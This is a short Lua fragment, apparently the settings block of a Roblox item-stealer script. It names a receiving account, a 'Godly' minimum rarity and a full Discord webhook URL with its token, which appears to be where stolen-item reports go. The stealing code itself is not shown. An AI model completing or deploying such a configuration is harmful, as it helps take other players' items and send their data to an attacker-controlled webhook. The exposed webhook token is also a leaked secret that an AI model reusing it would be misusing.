...
local users = {"damuffin_1234"}
local min_rarity = "Godly"
local min_value = 1
local ping = "Yes"
local webhook = "https://discord.com/api/webhooks/1456493903992590429/ow_zwjKx7Ae7gYvyaMijwQ8rPVubZwqwX6OymZZbAJYdIjjvlISTKK06GSQV9IigDGU9"
